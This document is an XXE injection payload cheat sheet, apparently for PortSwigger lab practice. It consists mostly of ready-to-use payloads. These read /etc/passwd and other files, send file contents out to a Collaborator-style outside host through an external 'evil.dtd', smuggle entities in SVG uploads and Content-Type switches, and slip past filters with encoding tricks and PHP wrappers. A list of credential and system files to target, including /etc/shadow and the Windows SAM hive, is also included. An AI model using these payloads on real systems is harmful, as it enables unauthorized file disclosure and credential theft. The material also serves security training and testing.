# XXE Injection - Payload Reference

## Classic XXE - File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <productId>&xxe;</productId>
</product>
```

## Blind XXE - OOB via DNS
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://BURP_COLLAB_DOMAIN">
]>
<product>
  <productId>&xxe;</productId>
</product>
```

## Blind XXE - Error-Based
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://BURP_COLLAB_DOMAIN/evil.dtd">
  %dtd;
  %send;
]>
<product>
  <productId>&xxe;</productId>
</product>
```

External DTD (evil.dtd):
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://BURP_COLLAB_DOMAIN/?%file;'>">
%all;
```

## XXE via File Upload
```
Upload SVG with XXE:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## XXE via Content-Type Change
```
POST /comment
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <text>&xxe;</text>
</comment>
```

## Bypass Filters

### WAF Bypass
```xml
<!ENTITY xxe SYSTEM "file:///e&#x74;c/passwd">
<!ENTITY xxe SYSTEM "file:///etc/pass%64">
```

### PHP Wrapper
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### UTF-16 Encoding
```
Convert entire XML payload to UTF-16
```

## Common Target Files
```
/etc/passwd
/etc/hostname
/etc/shadow
/proc/self/environ
/proc/self/cmdline
C:\windows\system32\config\sam
C:\windows\win.ini
```

## PortSwigger Lab Approach
1. Find XML input (comment, search, product check)
2. Inject classic XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
3. If no output: use blind XXE with Collaborator
4. If error messages: use error-based XXE
